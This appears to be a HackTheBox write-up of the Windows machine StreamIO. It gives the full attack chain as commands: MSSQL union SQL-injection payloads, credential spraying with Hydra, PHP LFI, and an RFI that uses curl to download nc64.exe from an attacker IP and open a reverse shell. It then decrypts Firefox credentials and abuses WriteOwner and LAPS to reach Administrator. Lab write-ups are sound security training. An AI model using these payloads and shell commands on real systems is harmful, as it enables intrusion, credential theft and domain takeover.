---
title: "HTB - StreamIO (Medium | Windows | Web)"
date: 2026-09-20 13:00:00 +0000
categories: [HackTheBox, Web]
tags: [htb, windows, php, vhosts, netexec, sqli, sqli-union, hydra, lfi, rfi, sqlcmd, evil-winrm, firefox, firepwd, bloodhound, laps, mssql, ffuf, php-filter-wrapper, winpeas, powerview, writeowner, readlapspassword]
description: "Union-based MSSQL SQLi & credential spraying, LFI/RFI to RCE, decrypt Firefox creds, then WriteOwner & ReadLAPSPassword to Administrator"
image:
  path: /assets/img/streamio.png
---

## **Recon**

```bash
nmap -p- -sC -sV --open --min-rate 5000 <target>
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-16 01:03:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
443/tcp   open  ssl/https?
|_ssl-date: 2026-09-16T01:05:55+00:00; +6h58m34s from scanner time.
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
62383/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-16T01:04:38
|_  start_date: N/A
|_clock-skew: mean: 6h58m34s, deviation: 0s, median: 6h58m33s
```

### Service Discovery Analysis

The Nmap scan reveals multiple critical services running on the target machine:

- **DNS (Port 53):** Simple DNS Plus
- **HTTP (Port 80):** Microsoft IIS 10.0 — default IIS page
- **Kerberos (Port 88):** Confirms Active Directory environment
- **SMB (Port 139, 445):** Microsoft Windows file sharing with message signing required
- **LDAP (Port 389, 636, 3268, 3269):** Active Directory LDAP services
- **HTTPS (Port 443):** SSL certificate reveals two SANs: `streamIO.htb` and `watch.streamIO.htb` ← critical finding
- **WinRM (Port 5985):** Windows Remote Management
- **RPC (Multiple high ports):** Various RPC endpoints

**Domain:** streamIO.htb **Hostname:** DC **OS:** Windows

Two things immediately stand out: the **SSL certificate on port 443** contains two Subject Alternative Names — `streamIO.htb` and `watch.streamIO.htb` — exposing a second subdomain without needing fuzzing. The **expired SSL certificate** (Feb-Mar 2022) suggests an older deployment. Both subdomains need to be added to `/etc/hosts` before proceeding:

```bash
echo "<target> streamio.htb watch.streamio.htb" | sudo tee -a /etc/hosts
```

---

## **User**

### Web Enumeration - HTTPS (Port 443)

Accessing `https://streamio.htb/` reveals a landing page for a movie streaming website:

![](/assets/img/streamio/Pasted_image_20260920094202.png)

Accessing the second subdomain `https://watch.streamio.htb/` discovered from the SSL certificate reveals a different application:

![](/assets/img/streamio/Pasted_image_20260920094318.png)

### Directory Enumeration - watch.streamio.htb

We use `dirsearch` to enumerate directories and pages on the watch subdomain. The `-i 200` flag filters to only show responses with HTTP 200 status codes, reducing noise:

```bash
dirsearch -u 'https://watch.streamio.htb/' -i 200
```

![](/assets/img/streamio/Pasted_image_20260920094654.png)

An interesting page is discovered: `search.php`. Visiting it reveals a movie search functionality:

![](/assets/img/streamio/Pasted_image_20260920094745.png)

### Overview - MSSQL Union-Based SQL Injection

**What is Union-Based SQL Injection?** Unlike blind SQL injection where we infer data from true/false responses, union-based injection allows directly extracting data by appending a `UNION SELECT` statement to the original query. The injected `SELECT` must match the same number of columns as the original query. By placing our payload in a column position that is reflected back on the page, we can exfiltrate data directly.

**Why MSSQL-specific payloads?** Different database engines have different built-in functions. Identifying the DB engine allows us to use the correct syntax — for example, `@@version` in MSSQL, `DB_NAME()` for the current database, and `STRING_AGG()` to concatenate multiple rows into one.

### SQL Injection - search.php

Manual testing of the search parameter reveals SQL injection. We first determine the number of columns by incrementing the count in our `UNION SELECT` until we stop getting errors, then confirming which column positions are reflected on the page:

```bash
10' union select 1,@@version,3,4,5,6-- -
```

![](/assets/img/streamio/Pasted_image_20260920094827.png)

The `@@version` output confirms this is **Microsoft SQL Server** running on the backend. Column 2 is reflected on the page.

#### Extract Current Database Name

Using `DB_NAME()` — an MSSQL built-in function that returns the name of the current database context:

```bash
10' union select 1,(select DB_NAME()),3,4,5,6-- -
```

![](/assets/img/streamio/Pasted_image_20260920095027.png)

#### Enumerate Tables

Using `STRING_AGG()` — an MSSQL aggregate function that concatenates multiple rows into a single string with a specified delimiter. This avoids needing multiple queries when there are many results. We query `STREAMIO..sysobjects` (the system catalog) for user tables (`xtype='U'`):

```bash
10' union select 1, (SELECT STRING_AGG(name, ',') name FROM STREAMIO..sysobjects WHERE xtype= 'U'),3,4,5,6-- -
```

![](/assets/img/streamio/Pasted_image_20260920094952.png)

A `users` table is discovered among others.

#### Enumerate Columns in users Table

Using `syscolumns` joined with `sysobjects` to retrieve column names for the `users` table:

```bash
10' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')-- -
```

![](/assets/img/streamio/Pasted_image_20260920095127.png)

#### Dump User Credentials

Using `CONCAT()` to combine username and password columns into a single output:

```bash
10' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -
```

![](/assets/img/streamio/Pasted_image_20260920095326.png)

A large list of MD5 password hashes is extracted. We upload them to CrackStation for offline cracking:

![](/assets/img/streamio/Pasted_image_20260920095526.png)

![](/assets/img/streamio/Pasted_image_20260920095559.png)

The cracked credentials are:

|Username|Password|
|---|---|
|admin|paddpadd|
|Barry|$hadoW|
|Bruno|$monique$1991$|
|Clara|%$clara|
|Juliette|$3xybitch|
|Lauren|##123a8j8w5123##|
|Lenord|physics69i|
|Michelle|!?Love?!123|
|Sabrina|!!sabrina$|
|Thane|highschoolmusical|
|Victoria|!5psycho8!|
|yoshihide|66boysandgirls..|

### Credential Spraying - streamio.htb Login

With a list of valid credentials, we use Hydra to spray them against the login panel at `streamio.htb`. The `-C` flag reads credentials from a file in `user:pass` format. The `F=Login failed` parameter tells Hydra what string indicates a failed login so it knows when to stop trying:

```bash
hydra -C userpass.txt -u streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
```

![](/assets/img/streamio/Pasted_image_20260920101758.png)

Valid credentials: `yoshihide:66boysandgirls..`

### Admin Panel Enumeration

After logging in as yoshihide, navigating to `/admin` reveals an administration panel:

![](/assets/img/streamio/Pasted_image_20260920102125.png)

The URL pattern uses parameters like `?user=`, `?staff=`, `?movie=`, and `?message=` to load sub-pages. This suggests a file inclusion mechanism. We use `ffuf` to fuzz for additional hidden parameters. The `--fs 1678` flag filters out responses with 1678 characters (the default page size when no parameter matches), and `-b` passes the session cookie for authenticated access:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ=' -b PHPSESSID=ielgha0jeum0ia1nuioei5idgc --fs 1678
```

![](/assets/img/streamio/Pasted_image_20260920102415.png)

A hidden `debug` parameter is found. Accessing `?debug=` returns a message saying it's for developers only:

![](/assets/img/streamio/Pasted_image_20260920102453.png)

Adding `index.php` to the debug parameter produces an error, confirming a local file inclusion vulnerability:

![](/assets/img/streamio/Pasted_image_20260920102519.png)

### LFI via PHP Filter Wrapper

Using the PHP filter wrapper to base64-encode the contents of `index.php` before inclusion — this prevents PHP execution and returns the raw source code instead:

```bash
?debug=php://filter/convert.base64-encode/resource=index.php
```

![](/assets/img/streamio/Pasted_image_20260920102644.png)

Decoding the base64 output reveals the source code including database credentials:

```bash
echo "" | base64 -d
```

![](/assets/img/streamio/Pasted_image_20260920102821.png)

### Directory Enumeration - Admin Panel

Fuzzing for additional PHP files in the admin panel using an authenticated session cookie:

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -u https://streamio.htb/admin/ -x php -c "PHPSESSID=ielgha0jeum0ia1nuioei5idgc"
```

![](/assets/img/streamio/Pasted_image_20260920103217.png)

A second PHP file `master.php` is found. Accessing it directly shows "Only accessible through includes":

![](/assets/img/streamio/Pasted_image_20260920103238.png)

### Reading master.php via LFI

Using the PHP filter wrapper again to read `master.php` source:

```bash
?debug=php://filter/convert.base64-encode/resource=master.php
```

Decoding the output:

```bash
echo "" | base64 -d
```

![](/assets/img/streamio/Pasted_image_20260920103506.png)

The source code reveals that `master.php` accepts an `include` parameter, reads remote file contents via `file_get_contents()`, and passes them to `eval()` — a classic Remote File Inclusion (RFI) leading to Remote Code Execution.

### Remote File Inclusion → Remote Code Execution

The attack chain is:

1. Use `?debug=master.php` in `index.php` to include `master.php`
2. Send a POST request with an `include` parameter pointing to our web server
3. Host a malicious PHP file that executes system commands

In Burp Suite, capture a GET request to `/admin/?debug=master.php`, send to Repeater, change to POST, and add the `include` parameter pointing to our IP.

We create `test.php` and verify code execution:

```bash
system("whoami");
```

Start a Python web server:

```bash
python3 -m http.server 8081
```

![](/assets/img/streamio/Pasted_image_20260920104210.png)

The server receives a request — confirming RFI. We now upload `nc64.exe` to the target using curl via our PHP payload:

```bash
# Upload nc64.exe to target
system("curl <attacker_ip>:8081/nc64.exe -o c:\\windows\\temp\\nc64.exe");
```

```bash
# Download nc64.exe locally first
wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe

# Start Python server
python3 -m http.server 8081
```

![](/assets/img/streamio/Pasted_image_20260920104621.png)

All requests return 200 OK confirming nc64.exe is uploaded. We update the PHP payload to execute a reverse shell:

```bash
system("c:\\windows\\temp\\nc64.exe <attacker_ip> 4444 -e cmd.exe");
```

Set up a listener with rlwrap for better shell interaction:

```bash
sudo rlwrap -cAr nc -lvnp 4444
```

Send the Burp request:

![](/assets/img/streamio/Pasted_image_20260920104847.png)

A reverse shell is received as the IIS web service account.

### Lateral Movement - MSSQL Credential Reuse

Returning to the `index.php` source code read earlier, we find database credentials:

![](/assets/img/streamio/Pasted_image_20260920105125.png)

We upgrade to PowerShell for better interaction, then use `sqlcmd` to query the local MSSQL instance. The `-S '(local)'` connects to the local SQL Server instance, `-U` and `-P` specify credentials, and `-Q` executes a query:

```powershell
powershell
sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT DB_NAME(); SELECT name FROM master..sysdatabases;'
```

![](/assets/img/streamio/Pasted_image_20260920105257.png)

A backup database `STREAMIO_BACKUP` is discovered. We enumerate its tables:

```powershell
sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT name FROM streamio_backup..sysobjects WHERE xtype = "U"'
```

![](/assets/img/streamio/Pasted_image_20260920105343.png)

We dump the users table from the backup database:

```powershell
sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'USE STREAMIO_BACKUP; select username,password from users;'
```

![](/assets/img/streamio/Pasted_image_20260920105414.png)

A new user `nikk37` is found with an MD5 hash. We crack it using CrackStation:

![](/assets/img/streamio/Pasted_image_20260920105522.png)

**Credentials:** `nikk37:get_dem_girls2@yahoo.com`

Verify WinRM access with netexec:

![](/assets/img/streamio/Pasted_image_20260920105633.png)

Connect via evil-winrm:

```bash
evil-winrm -i streamio.htb -u 'nikk37' -p 'get_dem_girls2@yahoo.com'
```

![](/assets/img/streamio/Pasted_image_20260920105833.png)

A shell is established as nikk37. The user flag can now be retrieved.

---

## **Root**

### WinPEAS Enumeration

We upload and execute WinPEAS to automate privilege escalation enumeration:

```bash
cp /usr/share/peass/winpeas/winPEASx64.exe .
upload winPEASx64.exe
.\winPEASx64.exe
```

![](/assets/img/streamio/Pasted_image_20260920111930.png)

WinPEAS identifies a **Firefox profile database** (`key4.db`) on the system — this is Firefox's credential storage, which may contain saved passwords.

### Overview - Firefox Credential Decryption (firepwd)

**What is key4.db?** Firefox stores saved login credentials encrypted in two files: `key4.db` (an SQLite database containing the master encryption key) and `logins.json` (containing the encrypted usernames and passwords). The encryption uses 3DES or AES-256 depending on the Firefox version.

**What is firepwd?** `firepwd.py` is an open-source Python tool that decrypts Firefox's password database offline by extracting the master key from `key4.db` and using it to decrypt the credentials stored in `logins.json`.

**Why is it dangerous here?** If a privileged user or domain admin has saved credentials in their Firefox profile, we can extract them without knowing the master password — Firefox's default protection is weak when we have filesystem access.

### Firefox Credential Extraction

Install firepwd and its dependencies:

```bash
wget https://raw.githubusercontent.com/lclevy/firepwd/master/firepwd.py
wget https://raw.githubusercontent.com/lclevy/firepwd/master/requirements.txt 
pip3 install -r requirements.txt --break-system-packages
```

Download the Firefox credential files from the target via evil-winrm:

```bash
download key4.db
download logins.json
```

![](/assets/img/streamio/Pasted_image_20260920112456.png)

Run firepwd to decrypt the credentials:

```bash
python firepwd.py
```

Output:

```
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

Multiple credentials are decrypted.

### Password Spraying with Extracted Credentials

We spray the new credentials against SMB to find valid logins:

```bash
nxc smb streamio.htb -u usernames2.txt -p passwords2.txt
```

![](/assets/img/streamio/Pasted_image_20260920112810.png)

Valid credentials: `JDgodd:JDg0dd1s@d0p3cr3@t0r`

### BloodHound Analysis

We collect Active Directory data as JDgodd to map privilege escalation paths:

```bash
bloodhound-python -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htb -dc dc.streamio.htb --zip -c All -ns <target>
```

![](/assets/img/streamio/Pasted_image_20260920113542.png)

BloodHound analysis reveals a critical escalation path:

- **JDgodd** has **WriteOwner** over the **CORE STAFF** group
- **CORE STAFF** has **LAPS Read** on the Domain Controller

This means if we add JDgodd to CORE STAFF, we can read the LAPS-managed Administrator password.

### Overview - LAPS (Local Administrator Password Solution)

**What is LAPS?** LAPS is a Microsoft solution that automatically manages and rotates local Administrator passwords on domain-joined machines. The password is stored in a confidential AD attribute (`ms-Mcs-AdmPwd`) on the computer object. Only authorized principals (groups or users) can read this attribute.

**Why is it exploitable here?** By adding JDgodd to the CORE STAFF group (which has LAPS Read access), JDgodd gains the ability to read the local Administrator password from Active Directory — giving us full administrative access to the DC.

### Abusing WriteOwner → CORE STAFF → LAPS

#### Step 1: Upload and Import PowerView

Through the nikk37 evil-winrm session, upload PowerView for AD manipulation:

```powershell
upload PowerView.ps1
. .\PowerView.ps1
```

#### Step 2: Create Credential Object for JDgodd

PowerView functions that modify AD objects require explicit credentials when running as a different user. We create a PSCredential object for JDgodd:

```powershell
$pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
```

#### Step 3: Grant JDgodd GenericAll on CORE STAFF

Using the WriteOwner privilege, we first set JDgodd as owner of CORE STAFF, then grant full control (GenericAll) — this enables adding members to the group:

```powershell
Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
```

#### Step 4: Add JDgodd to CORE STAFF

With GenericAll now granted, we add JDgodd as a member of the CORE STAFF group:

```powershell
Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
```

#### Step 5: Verify Group Membership

Confirm JDgodd is now in CORE STAFF:

```powershell
net user jdgodd
```

![](/assets/img/streamio/Pasted_image_20260920114233.png)

#### Step 6: Read LAPS Password

With JDgodd now a member of CORE STAFF (which has LAPS Read on the DC), we can read the local Administrator password. The `--laps` flag reads the `ms-Mcs-AdmPwd` attribute:

```bash
nxc smb streamio.htb -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
```

![](/assets/img/streamio/Pasted_image_20260920114616.png)

**Administrator LAPS Password:** `Gv.!eZy8+T0U#M`

#### Step 7: Establish Administrator Shell

Connect as Administrator using the LAPS password:

```bash
evil-winrm -i streamio.htb -u 'Administrator' -p 'Gv.!eZy8+T0U#M'
```

![](/assets/img/streamio/Pasted_image_20260920114802.png)

Full domain administrator access is achieved. The root flag is found on Martin's desktop.

---

### Attack Chain Summary

1. **Reconnaissance:** Nmap identified Active Directory infrastructure with HTTPS on port 443; SSL certificate revealed two SANs exposing `watch.streamio.htb`
2. **Directory Enumeration:** Used dirsearch on `watch.streamio.htb` and discovered `search.php` with movie search functionality
3. **MSSQL Union Injection:** Exploited SQL injection in `search.php` to enumerate the database, tables, and dump MD5 hashes from the `users` table
4. **Hash Cracking:** Cracked MD5 hashes using CrackStation to obtain 12 plaintext credentials
5. **Credential Spraying:** Used Hydra to spray credentials against `streamio.htb` login; identified `yoshihide:66boysandgirls..`
6. **Admin Panel LFI:** Discovered hidden `debug` parameter via ffuf; exploited PHP filter wrapper LFI to read `index.php` and `master.php` source
7. **Remote Code Execution:** Abused `master.php` RFI via `eval(file_get_contents())` to upload nc64.exe and establish reverse shell
8. **MSSQL Lateral Movement:** Used DB credentials from `index.php` source to query local MSSQL, found `STREAMIO_BACKUP` database with `nikk37` credentials
9. **WinRM Access:** Cracked nikk37's MD5 hash and established evil-winrm session; retrieved user flag
10. **Firefox Credential Extraction:** WinPEAS identified Firefox `key4.db`; used firepwd to decrypt saved credentials including `JDgodd:JDg0dd1s@d0p3cr3@t0r`
11. **BloodHound Analysis:** Identified JDgodd WriteOwner over CORE STAFF → CORE STAFF LAPS Read on DC
12. **LAPS Exploitation:** Used PowerView to add JDgodd to CORE STAFF, then read Administrator LAPS password via netexec
13. **Full Compromise:** Authenticated as Administrator and retrieved root flag from Martin's desktop